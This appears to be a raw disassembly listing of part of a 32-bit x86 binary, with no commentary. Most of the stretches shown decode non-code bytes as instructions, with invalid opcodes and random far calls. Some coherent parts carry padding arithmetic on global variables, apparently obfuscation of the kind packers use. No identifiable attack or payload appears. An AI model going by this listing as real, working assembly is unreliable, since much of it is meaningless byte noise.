  4072d1:	or     eax,0x3d496e04
  4072d6:	dec    esi
  4072d7:	in     al,0x0
  4072d9:	enter  0x9908,0x94
  4072dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072de:	pop    ecx
  4072df:	mov    ch,0xf3
  4072e1:	jne    0x4072a3
  4072e3:	add    DWORD PTR [ebp+ebp*8+0x70],esi
  4072e7:	vpsubsb xmm4,xmm5,XMMWORD PTR [ebp+0x3d]
  4072ec:	mov    ds:0x9f0e1da3,al
  4072f1:	mov    dl,0xb4
  4072f3:	xchg   ah,ah
  4072f5:	and    BYTE PTR [edi+0x2],dh
  4072f8:	call   0xd57c:0xd05612c1
  4072ff:	lea    ecx,[edi+0x40]
  407302:	ret    0xca3d
  407305:	xchg   esp,eax
  407306:	inc    ebx
  407307:	mov    ds:0x26f899c7,eax
  40730c:	xchg   BYTE PTR [ecx+0x31],cl
  40730f:	inc    esp
  407310:	jmp    0x32aa:0x9314895a
  407317:	adc    edx,DWORD PTR [esp+edx*4]
  40731a:	dec    esi
  40731b:	or     ebx,DWORD PTR [ebp-0x54]
  40731e:	rcl    edx,cl
  407320:	mov    eax,ds:0x2c452631
  407325:	out    dx,al
  407326:	jp     0x407363
  407328:	mov    ah,0x91
  40732a:	push   eax
  40732b:	lods   eax,DWORD PTR ds:[esi]
  40732c:	fisttp WORD PTR [esi+0x3527a7e2]
  407332:	sti    
  407333:	mov    gs,WORD PTR [ebp+ebp*2-0x5be60743]
  40733a:	inc    esp
  40733b:	cmp    ebx,DWORD PTR [ebp+0x186eb161]
  407341:	jp     0x4073af
  407343:	dec    edx
  407344:	mov    ds:0x458b4e05,eax
  407349:	hlt    
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073fc:	mov    ds:0xcff76452,eax
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x407482
  407408:	retf   0x6cbe
  40740b:	out    dx,al
  40740c:	fs dec ebx
  40740e:	(bad)  
  40740f:	dec    eax
  407410:	lock jg 0x407399
  407413:	pop    ebx
  407414:	adc    ah,BYTE PTR [edx]
  407416:	and    DWORD PTR [ecx-0x3a16108e],ecx
  40741c:	inc    ebp
  40741d:	jmp    0x59c3:0xf64810d1
  407424:	pop    ebp
  407425:	(bad)  
  407426:	int    0x89
  407428:	shl    DWORD PTR [esi-0x47e3c731],1
  40742e:	stc    
  40742f:	into   
  407430:	pop    eax
  407431:	(bad)  
  407433:	cwde   
  407434:	sahf   
  407435:	mov    ds:0x186f1d11,al
  40743a:	or     ch,dh
  40743c:	mov    ch,0x84
  40743e:	jbe    0x40743c
  407440:	jo     0x40740d
  407442:	sbb    DWORD PTR [eax-0xaf61adb],ebp
  407448:	dec    esi
  407449:	call   0x4c1d:0x2316e9e3
  407450:	push   0x4aea194b
  407455:	jg     0x40743d
  407457:	push   ebp
  407458:	xor    eax,esp
  40745a:	jnp    0x407450
  40745c:	add    al,0x7b
  40745e:	imul   ecx,ebp,0xffffff8c
  407461:	jmp    0x471d:0xc8a4fc89
  407468:	imul   esi,eax,0xfffffffb
  40746b:	mov    al,ds:0xbbfc9ad5
  407470:	call   0x5bb1:0x798ff5
  407477:	mov    al,0x2
  407479:	or     BYTE PTR [ecx],dh
  40747b:	push   edi
  40747c:	std    
  40747d:	fstp   TBYTE PTR [ebp+0x3b]
  407480:	(bad)  
  407481:	push   edi
  407482:	mov    esi,0x66cdd28a
  407487:	cmp    al,0x8b
  407489:	aaa    
  40748a:	xchg   edi,eax
  40748b:	stos   BYTE PTR es:[edi],al
  40748c:	adc    eax,0x961e391b
  407491:	int    0xe3
  407493:	wbinvd 
  407495:	and    esi,edx
  407497:	inc    eax
  407498:	lods   al,BYTE PTR ds:[esi]
  407499:	mov    ebx,0x18392b2a
  40749e:	mov    esi,0x7272b2c3
  4074a3:	push   edi
  4074a4:	pop    ds
  4074a5:	nop
  4074a6:	push   eax
  4074a7:	sbb    ecx,ebx
  4074a9:	repz pop ecx
  4074ab:	stc    
  4074ac:	je     0x407458
  4074ae:	mov    esi,0xec9121b
  4074b3:	cs stos BYTE PTR es:[edi],al
  4074b5:	sbb    DWORD PTR [ebp-0x46],0xfbb338fb
  4074bc:	fimul  WORD PTR [edx]
  4074be:	aas    
  4074bf:	dec    eax
  4074c0:	pop    ebx
  4074c1:	ror    BYTE PTR [edi],1
  4074c3:	sahf   
  4074c4:	stos   DWORD PTR es:[edi],eax
  4074c5:	call   0x4b17:0x5f97a56b
  4074cc:	mov    ds:0xd50deaf3,eax
  4074d1:	call   0xbb8625eb
  4074d6:	jl     0x407520
  4074d8:	dec    esp
  4074d9:	inc    ebx
  4074da:	sar    BYTE PTR [ebp+edx*1-0x2c7a1ba9],1
  4074e1:	iret   
  4074e2:	movlps xmm2,QWORD PTR [eax-0x4e]
  4074e6:	ret    
  4074e7:	imul   ebp,edx,0x73c09ce3
  4074ed:	push   ebp
  4074ee:	lods   al,BYTE PTR ds:[esi]
  4074ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074f0:	je     0x40749f
  4074f2:	inc    edi
  4074f3:	jbe    0x40753a
  4074f5:	nop
  4074f6:	xchg   ebx,eax
  4074f7:	sub    al,BYTE PTR [edi]
  4074f9:	jne    0x4074d3
  4074fb:	mov    dh,0x41
  4074fd:	(bad)  
  4074fe:	mov    al,bh
  407500:	inc    ebx
  407501:	pop    ss
  407502:	sbb    ch,BYTE PTR [edx+0x6cb18c86]
  407508:	mov    ?,WORD PTR [eax-0x1b45655e]
  40750e:	(bad)  
  40750f:	fist   DWORD PTR [ecx]
  407511:	sbb    ebp,0xd645182b
  407517:	call   0x1a4c8986
  40751c:	mov    BYTE PTR [ecx+eax*2],bl
  40751f:	mov    cl,0x62
  407521:	mov    ds:0xd014e66c,eax
  407526:	cld    
  407527:	pushf  
  407528:	(bad)  
  407529:	cs (bad) 
  40752b:	cmp    bh,al
  40752d:	inc    edi
  40752e:	mov    esp,?
  407530:	sbb    al,0xc9
  407532:	adc    esp,DWORD PTR [ecx+0x3c]
  407535:	shl    BYTE PTR [esi+0x6e],cl
  407538:	sbb    eax,0x765f61d
  40753d:	push   esi
  40753e:	xchg   edi,eax
  40753f:	mov    ah,0xc0
  407541:	sbb    ecx,DWORD PTR [ebx+0x76]
  407544:	pop    ebp
  407545:	cmc    
  407546:	dec    esp
  407547:	mov    ebp,0xa184c02d
  40754c:	aad    0x30
  40754e:	leave  
  40754f:	popf   
  407550:	sbb    ecx,DWORD PTR [ecx]
  407552:	mov    al,ds:0x966ef54
  407557:	into   
  407558:	(bad)  
  407559:	or     ebp,DWORD PTR [eax+0x48]
  40755c:	int    0xb
  40755e:	ja     0x407516
  407560:	repnz dec esp
  407562:	or     BYTE PTR [eax+ebp*8],dh
  407565:	gs hlt 
  407567:	jns    0x40757b
  407569:	js     0x40750a
  40756b:	test   eax,0xf36c69cc
  407570:	cmp    eax,0x3138896f
  407575:	stos   DWORD PTR es:[edi],eax
  407576:	push   0xa1fae5b8
  40757b:	ss pushf 
  40757d:	pop    ecx
  40757e:	mov    ebp,0xcf9c682c
  407583:	pop    ss
  407584:	cdq    
  407585:	inc    ecx
  407586:	adc    edx,DWORD PTR [edi]
  407588:	scas   eax,DWORD PTR es:[edi]
  407589:	ja     0x4075af
  40758b:	mov    BYTE PTR [esi+0x10],bl
  40758e:	pop    esi
  40758f:	frstor [ecx]
  407591:	aad    0xa3
  407593:	xor    BYTE PTR [ebx],0xa4
  407596:	push   ebp
  407597:	xchg   esi,eax
  407598:	retf   
  407599:	mov    ch,0x7d
  40759b:	mov    esp,0xe3362d06
  4075a0:	push   esi
  4075a1:	int3   
  4075a2:	jle    0x407568
  4075a4:	lea    edi,[ecx-0x6c]
  4075a7:	pop    edx
  4075a8:	xchg   esp,eax
  4075a9:	push   0xd34e7176
  4075ae:	and    eax,DWORD PTR [eax]
  4075b0:	xchg   esp,eax
  4075b1:	in     eax,0xe2
  4075b3:	mov    bl,0xb3
  4075b5:	cmp    al,0x42
  4075b7:	xor    ecx,DWORD PTR [ecx]
  4075b9:	xchg   ebp,eax
  4075ba:	mov    esi,0xef4cc3a2
  4075bf:	lds    ecx,FWORD PTR [ecx-0x28]
  4075c2:	in     eax,0x33
  4075c4:	xor    BYTE PTR [esi],0xf0
  4075c7:	sub    dh,BYTE PTR [ebx-0x52]
  4075ca:	mov    BYTE PTR [ebp+0x373d1549],dl
  4075d0:	and    cl,BYTE PTR [edx]
  4075d2:	out    dx,al
  4075d3:	jno    0x407568
  4075d5:	xor    BYTE PTR [eax+0x35],bl
  4075d8:	jb     0x40760a
  4075da:	mov    ds:0xd7102341,al
  4075df:	fbld   TBYTE PTR [edi-0x471e0a69]
  4075e5:	mov    dh,0x49
  4075e7:	fsubp  st(4),st
  4075e9:	sbb    DWORD PTR [ebx-0x70],0x80fd9145
  4075f0:	ins    BYTE PTR es:[edi],dx
  4075f1:	sub    eax,0x63cb250f
  4075f6:	lock (bad) 
  4075f8:	push   esp
  4075f9:	pop    ss
  4075fa:	inc    edi
  4075fb:	sbb    eax,0xad85ce07
  407600:	stos   DWORD PTR es:[edi],eax
  407601:	fsubr  QWORD PTR [ecx-0x2b]
  407604:	js     0x40761e
  407606:	popf   
  407607:	pop    ecx
  407608:	jl     0x40763a
  40760a:	push   0x2d
  40760c:	cmp    eax,0x93ae2f7e
  407611:	mov    ds:0x4b2af322,eax
  407616:	fistp  WORD PTR [edi]
  407618:	int    0x80
  40761a:	cli    
  40761b:	add    edi,DWORD PTR [ecx]
  40761d:	adc    BYTE PTR [esi],cl
  40761f:	xlat   BYTE PTR ds:[ebx]
  407620:	ins    DWORD PTR es:[edi],dx
  407621:	arpl   bx,ax
  407623:	or     esp,edx
  407625:	arpl   WORD PTR ds:0x79da5d59,bx
  40762b:	add    al,BYTE PTR [edi-0x4a402f2b]
  407631:	and    ebp,DWORD PTR [edi+0x3db6189e]
  407637:	clc    
  407638:	outs   dx,BYTE PTR ds:[esi]
  407639:	stos   DWORD PTR es:[edi],eax
  40763a:	mov    dh,0xd2
  40763c:	fld    QWORD PTR [eax+0x58]
  40763f:	inc    ebx
  407640:	aas    
  407641:	hlt    
  407642:	loopne 0x407606
  407644:	inc    esp
  407645:	dec    edx
  407646:	cdq    
  407647:	or     eax,0x4ef6a6eb
  40764c:	jnp    0x4076b8
  40764e:	scas   eax,DWORD PTR es:[edi]
  40764f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407650:	dec    ecx
  407651:	mov    esi,0x1bc6b67d
  407656:	inc    eax
  407657:	pop    eax
  407658:	pop    edx
  407659:	mov    esi,0x4d7d9ccf
  40765e:	fnstcw WORD PTR [edx]
  407660:	int3   
  407661:	pop    ecx
  407662:	mov    ebx,DWORD PTR [ebp+0x25ce66c1]
  407668:	jmp    FWORD PTR [eax]
  40766a:	out    dx,eax
  40766b:	(bad)  
  40766c:	arpl   WORD PTR [edx],si
  40766e:	mov    esp,0xd8ecfe6
  407673:	inc    ebp
  407674:	lock add al,0x19
  407677:	sbb    DWORD PTR [esi-0x16bb63fb],ecx
  40767d:	lods   al,BYTE PTR ds:[esi]
  40767e:	or     cl,BYTE PTR [ecx+0x2f8fef6a]
  407684:	iret   
  407685:	ret    
  407686:	(bad)  
  407688:	inc    esi
  407689:	mov    ds:0x5788f14f,eax
  40768e:	retf   
  40768f:	js     0x4076fd
  407691:	pop    esp
  407692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407693:	ss mov DWORD PTR fs:[edx-0x44],ecx
  407698:	add    al,0xf7
  40769a:	mov    DWORD PTR [ebp-0x5b4a2a3c],edi
  4076a0:	aad    0x0
  4076a2:	or     BYTE PTR [edx+eiz*4-0x47],bl
  4076a6:	add    ebx,DWORD PTR [edx]
  4076a8:	out    0x26,eax
  4076aa:	xchg   edx,eax
  4076ab:	push   esp
  4076ac:	fs es (bad) 
  4076af:	sbb    esi,DWORD PTR [ebp-0x3d]
  4076b2:	inc    esi
  4076b3:	mov    dl,0xa0
  4076b5:	xor    ah,BYTE PTR [edi]
  4076b7:	test   BYTE PTR [ebp-0x7],cl
  4076ba:	stos   BYTE PTR es:[edi],al
  4076bb:	cmp    esp,DWORD PTR [ebx-0x4271f9d2]
  4076c1:	xchg   esi,eax
  4076c2:	push   esi
  4076c3:	mov    cl,0xd6
  4076c5:	xchg   esp,eax
  4076c6:	jp     0x4076a3
  4076c8:	xchg   esp,eax
  4076c9:	leave  
  4076ca:	add    eax,0xd24d3ceb
  4076cf:	jle    0x4076b0
  4076d1:	aad    0xff
  4076d3:	mov    al,ds:0x8103ac05
  4076d8:	mov    ebx,DWORD PTR [esi+0x51]
  4076db:	or     eax,0x1fea1d29
  4076e0:	mov    WORD PTR [ecx],cs
  4076e2:	imul   eax,DWORD PTR [edx+0x12],0x26
  4076e6:	popa   
  4076e7:	pusha  
  4076e8:	shl    BYTE PTR [ebp+eax*2+0x34],cl
  4076ec:	dec    DWORD PTR [ecx]
  4076ee:	test   BYTE PTR [esp+esi*8],ah
  4076f1:	mov    ebp,0xa6204cc3
  4076f6:	es into 
  4076f8:	in     eax,dx
  4076f9:	sub    eax,0xc9f7dcbb
  4076fe:	pop    eax
  4076ff:	leave  
  407700:	sub    DWORD PTR [ebp+ebx*2+0x964f74f],0xe2e77633
  40770b:	loopne 0x407708
  40770d:	xor    al,0x8c
  40770f:	aam    0xd6
  407711:	sbb    eax,esp
  407713:	mov    al,0x41
  407715:	fist   DWORD PTR [edi]
  407717:	hlt    
  407718:	nop
  407719:	push   eax
  40771a:	fldenv [edi-0x3a]
  40771d:	ins    BYTE PTR es:[edi],dx
  40771e:	cli    
  40771f:	out    dx,al
  407720:	scas   eax,DWORD PTR es:[edi]
  407721:	mov    bh,BYTE PTR [ebp+0x43619b8d]
  407727:	ja     0x407710
  407729:	(bad)  
  40772a:	shl    BYTE PTR [ecx],1
  40772c:	enter  0xd4ba,0xa8
  407730:	mov    ds:0x5220ba,al
  407735:	int    0x57
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	lods   eax,DWORD PTR ds:[esi]
  4077da:	mov    ebx,0xcca78fcf
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x4077fa
  4077e6:	rcr    BYTE PTR [ebp-0x37],1
  4077e9:	(bad)  
  4077ea:	test   al,0x9c
  4077ec:	xchg   ebx,eax
  4077ed:	mov    ebx,0x2676a87e
  4077f2:	shl    DWORD PTR [ebx-0x70],1
  4077f5:	pusha  
  4077f6:	test   eax,0x2fc66996
  4077fb:	(bad)  
  4077fd:	ins    DWORD PTR es:[edi],dx
  4077fe:	call   0xf03f:0xf96a4193
  407805:	jle    0x4077ca
  407807:	xchg   esp,eax
  407808:	mov    WORD PTR [edi+0x1b],?
  40780b:	fwait
  40780c:	sahf   
  40780d:	data16 add dh,ch
  407810:	pop    es
  407811:	jne    0x4077fa
  407813:	out    dx,al
  407814:	add    ebx,esp
  407816:	shr    BYTE PTR [edi],1
  407818:	icebp  
  407819:	ss shl ah,0x3f
  40781d:	sbb    eax,0x4b3e97f6
  407822:	jg     0x407825
  407824:	pop    esi
  407825:	cdq    
  407826:	(bad)  
  407827:	mov    BYTE PTR ds:0x25f4af84,al
  40782d:	loope  0x4077dd
  40782f:	xor    ah,BYTE PTR [ebx]
  407831:	xchg   edi,eax
  407832:	jae    0x407824
  407834:	dec    edx
  407835:	or     ah,al
  407837:	int    0x75
  407839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40783a:	and    al,0xe8
  40783c:	mov    ebx,0x7209735b
  407841:	in     al,dx
  407842:	and    eax,0x5e8cf714
  407847:	cmp    edx,DWORD PTR [ebp-0x63]
  40784a:	adc    edx,edx
  40784c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40784d:	clc    
  40784e:	ret    
  40784f:	sbb    dl,BYTE PTR [edx+0x1422b553]
  407855:	lahf   
  407856:	jl     0x40788a
  407858:	inc    esp
  407859:	jns    0x407827
  40785b:	sbb    edx,DWORD PTR [ebx+0x405a120d]
  407861:	cli    
  407862:	inc    ebx
  407863:	xor    eax,0x472f0bd5
  407868:	cmp    BYTE PTR [ecx-0x74],ah
  40786b:	push   cs
  40786c:	cmc    
  40786d:	fsubr  QWORD PTR [eax-0x1b]
  407870:	pop    es
  407871:	adc    eax,DWORD PTR [esi]
  407873:	adc    eax,edi
  407875:	mov    cl,0xce
  407877:	dec    ebp
  407878:	fild   WORD PTR [edx+eiz*2-0xba193f1]
  40787f:	pop    eax
  407880:	(bad)  ss:[ecx+0x7db9e9fd]
  407887:	add    DWORD PTR [ebp-0x37023c4c],ebp
  40788d:	xor    ebp,DWORD PTR [ecx]
  40788f:	and    eax,0xc08d0d23
  407894:	jbe    0x407840
  407896:	aad    0x4e
  407898:	test   eax,0xf5794410
  40789d:	mov    al,ds:0x66377fba
  4078a2:	sti    
  4078a3:	retf   0xec1d
  4078a6:	jns    0x4078b6
  4078a8:	sbb    esp,DWORD PTR [esp+ebp*1+0x73caf456]
  4078af:	jmp    0x6849d6e7
  4078b4:	pop    esp
  4078b5:	int3   
  4078b6:	ret    
  4078b7:	ret    
  4078b8:	in     eax,dx
  4078b9:	(bad)  
  4078ba:	sar    eax,cl
  4078bc:	imul   DWORD PTR [ecx]
  4078be:	inc    eax
  4078bf:	aam    0x4
  4078c1:	mov    dl,0xa9
  4078c3:	(bad)  
  4078c4:	xlat   BYTE PTR ds:[ebx]
  4078c5:	xchg   edi,eax
  4078c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078c7:	into   
  4078c8:	rol    BYTE PTR fs:[bp+0x604f],cl
  4078ce:	popa   
  4078cf:	add    al,0x22
  4078d1:	mov    bl,0x1b
  4078d3:	fs pop ebp
  4078d5:	enter  0x402d,0x3a
  4078d9:	cmp    BYTE PTR [edi],ch
  4078db:	rcr    ecx,1
  4078dd:	adc    al,0x87
  4078df:	push   ebx
  4078e0:	sbb    al,0xb6
  4078e2:	enter  0x7398,0xa4
  4078e6:	xor    ebp,DWORD PTR [ebx+0x31]
  4078e9:	mov    edx,?
  4078eb:	xor    al,BYTE PTR [ebp+0x1760427c]
  4078f1:	shufps xmm5,XMMWORD PTR [edi-0x31],0x74
  4078f6:	das    
  4078f7:	add    bh,dl
  4078f9:	xchg   edi,eax
  4078fa:	sub    cl,BYTE PTR [ebp-0x4d]
  4078fd:	xchg   ebx,eax
  4078fe:	out    dx,al
  4078ff:	neg    BYTE PTR [ebx-0x9792221]
  407905:	xor    BYTE PTR [ebx+0x5b354bc7],ch
  40790b:	out    0x4a,al
  40790d:	inc    ebx
  40790e:	inc    edx
  40790f:	xor    BYTE PTR [ecx],dl
  407911:	or     eax,0x34
  407914:	ss loop 0x4078dc
  407917:	call   0xe9d4c51e
  40791c:	and    al,0xd3
  40791e:	mov    eax,edi
  407920:	in     eax,0x4d
  407922:	pop    esi
  407923:	or     edx,DWORD PTR ds:0xf3da0580
  407929:	dec    ebx
  40792a:	sbb    al,0xbc
  40792c:	jne    0x407901
  40792e:	mov    ds:0xd2cf8270,al
  407933:	stos   DWORD PTR es:[edi],eax
  407934:	lds    eax,FWORD PTR [eax+0x41]
  407937:	fdivr  QWORD PTR [edx]
  407939:	out    dx,al
  40793a:	mov    al,ds:0x59a2996f
  40793f:	std    
  407940:	push   0x1f
  407942:	pop    ss
  407943:	clc    
  407944:	mov    bl,0x8e
  407946:	jg     0x4079a6
  407948:	cmp    edx,DWORD PTR [edx+0x25]
  40794b:	sbb    DWORD PTR [esp+ecx*4],edx
  40794e:	sbb    ch,ah
  407950:	mov    bh,0x30
  407952:	or     esp,DWORD PTR [ecx-0x61]
  407955:	push   esi
  407956:	mov    al,0xcf
  407958:	or     esi,esp
  40795a:	xchg   esp,eax
  40795b:	or     BYTE PTR [eax-0x21],0xeb
  40795f:	repz pop esp
  407961:	jne    0x40792c
  407963:	shl    BYTE PTR [eax-0x28],1
  407966:	packuswb mm5,QWORD PTR [ecx+eax*8-0x2d]
  40796b:	sbb    al,0xb5
  40796d:	pushf  
  40796e:	xchg   esi,eax
  40796f:	(bad)  
  407970:	(bad)  
  407971:	lahf   
  407972:	sub    ebx,DWORD PTR [esi-0x40d4c87e]
  407978:	pusha  
  407979:	call   0x3e53:0x2d5d6929
  407980:	cmp    BYTE PTR [eax-0x5a],bh
  407983:	and    BYTE PTR [ebp+0x55ae0b98],dh
  407989:	retf   
  40798a:	shr    DWORD PTR [eax+0x685578b5],cl
  407990:	stc    
  407991:	inc    esp
  407992:	push   ds
  407993:	mov    al,0x1d
  407995:	adc    BYTE PTR [ecx+ebx*8-0x1277a4ec],dl
  40799c:	jle    0x4079ac
  40799e:	sar    BYTE PTR [edx-0x5b],1
  4079a1:	dec    ecx
  4079a2:	pusha  
  4079a3:	or     eax,0xbbea99e3
  4079a8:	mov    ah,0x3a
  4079aa:	lods   eax,DWORD PTR ds:[esi]
  4079ab:	mov    bh,cl
  4079ad:	inc    ecx
  4079ae:	xchg   ebx,eax
  4079af:	dec    ebx
  4079b0:	jbe    0x4079ee
  4079b2:	retf   
  4079b3:	xor    ah,BYTE PTR [edx+eax*4+0x18]
  4079b7:	mov    ch,0xc0
  4079b9:	stos   DWORD PTR es:[edi],eax
  4079ba:	jae    0x407a0e
  4079bc:	jo     0x407a12
  4079be:	jbe    0x4079e9
  4079c0:	call   0x8804:0x97e404ff
  4079c7:	outs   dx,DWORD PTR ds:[esi]
  4079c8:	outs   dx,BYTE PTR ds:[esi]
  4079c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ca:	mov    edi,0x3be8f7a8
  4079cf:	test   al,0x45
  4079d1:	(bad)  
  4079d2:	fld    DWORD PTR [edx+0x14]
  4079d5:	cli    
  4079d6:	std    
  4079d7:	sub    BYTE PTR [esi-0x62],0xd4
  4079db:	mov    eax,0xcff1988b
  4079e0:	sbb    cl,BYTE PTR ds:0x515b589d
  4079e6:	sub    esp,DWORD PTR [esi+0x34]
  4079e9:	test   BYTE PTR [ebx],bl
  4079eb:	cmp    ebx,ebx
  4079ed:	cmp    BYTE PTR [edi-0x117ca2a2],bl
  4079f3:	shl    BYTE PTR [edi],cl
  4079f5:	jns    0x4079f7
  4079f7:	pop    ss
  4079f8:	loop   0x407a52
  4079fa:	ror    BYTE PTR [eax],1
  4079fc:	pop    ebx
  4079fd:	sub    eax,0xeac7281b
  407a02:	pop    ss
  407a03:	cld    
  407a04:	xor    BYTE PTR [ebp-0x25],bh
  407a07:	mov    ds:0x20bb892b,eax
  407a0c:	test   DWORD PTR [edx],ecx
  407a0e:	or     eax,0x95c646d7
  407a13:	push   eax
  407a14:	psrlw  mm5,QWORD PTR [eax-0x25d2604d]
  407a1b:	sbb    edx,esi
  407a1d:	data16 hlt 
  407a1f:	fdiv   DWORD PTR [ebx+0x4cc3b0bf]
  407a25:	jl     0x4079ed
  407a27:	sub    DWORD PTR [ecx+eiz*8-0x65a8fd60],edx
  407a2e:	ins    BYTE PTR es:[edi],dx
  407a2f:	dec    BYTE PTR [ebp-0x30]
  407a32:	xchg   DWORD PTR [edx],esi
  407a34:	cmp    DWORD PTR [esp+eiz*2+0x1f],esp
  407a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a39:	or     ah,ch
  407a3b:	push   0xe388269c
  407a40:	je     0x407a1f
  407a42:	pop    es
  407a43:	or     dh,BYTE PTR [esi]
  407a45:	loop   0x4079f8
  407a47:	ficom  DWORD PTR [edi]
  407a49:	push   ds
  407a4a:	aam    0x4c
  407a4c:	popa   
  407a4d:	xchg   edi,eax
  407a4e:	mov    eax,ds:0xcf0885ad
  407a53:	or     BYTE PTR [ebx+0x68],ah
  407a56:	fdiv   DWORD PTR [esi]
  407a58:	es fdiv st(6),st
  407a5b:	adc    eax,0xa71cc413
  407a60:	xor    BYTE PTR ds:0x424cface,cl
  407a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a67:	mov    edi,0x2ce7236a
  407a6c:	fucomp st(6)
  407a6e:	dec    edi
  407a6f:	(bad)
  407a73:	mov    ch,0xd9
  407a75:	dec    edi
  407a76:	push   ebx
  407a77:	scas   al,BYTE PTR es:[edi]
  407a78:	(bad)  
  407a79:	pop    ebx
  407a7a:	outs   dx,DWORD PTR ds:[esi]
  407a7b:	(bad)  
  407a7c:	daa    
  407a7d:	test   eax,0x9600fccc
  407a82:	dec    ebx
  407a83:	fld    QWORD PTR [edi*1+0x4342d39e]
  407a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a8b:	call   0x55d670d
  407a90:	stos   DWORD PTR es:[edi],eax
  407a91:	mov    WORD PTR [ebp-0x596a2aca],es
  407a97:	mov    ch,0x30
  407a99:	push   edi
  407a9a:	cmp    al,0x2b
  407a9c:	and    DWORD PTR [ebx+ebx*4+0x114b40e],0x9cd90abf
  407aa7:	mov    al,ds:0xf1a75d72
  407aac:	mov    ebx,ss
  407aae:	mov    ebp,0x3b530ad3
  407ab3:	push   eax
  407ab4:	stos   DWORD PTR es:[edi],eax
  407ab5:	add    eax,0xc3515271
  407aba:	jo     0x407b3b
  407abc:	push   ds
  407abd:	enter  0x8c99,0xbe
  407ac1:	push   edi
  407ac2:	test   al,0xef
  407ac4:	iret   
  407ac5:	xchg   ebp,eax
  407ac6:	in     eax,dx
  407ac7:	xor    bl,BYTE PTR [edx+0x54f412ef]
  407acd:	pop    es
  407ace:	push   ss
  407acf:	lock push ebx
  407ad1:	mov    dl,0xd5
  407ad3:	mov    ecx,0x4dca4a67
  407ad8:	push   ss
  407ad9:	dec    esi
  407ada:	(bad)  
  407adb:	xor    eax,0x5147367c
  407ae0:	shr    DWORD PTR [ecx],1
  407ae2:	or     cl,BYTE PTR [ecx]
  407ae4:	xor    ah,ah
  407ae6:	loopne 0x407b64
  407ae8:	mov    ebx,0x2dc87212
  407aed:	push   0xffffffd4
  407aef:	push   ebp
  407af0:	nop
  407af1:	jmp    0xc5369205
  407af6:	lods   eax,DWORD PTR ds:[esi]
  407af7:	mov    ?,WORD PTR [edi+ecx*2+0x2c]
  407afb:	in     eax,0x8c
  407afd:	adc    ecx,DWORD PTR [edi-0x8]
  407b00:	push   edx
  407b01:	fwait
  407b02:	sub    dl,cl
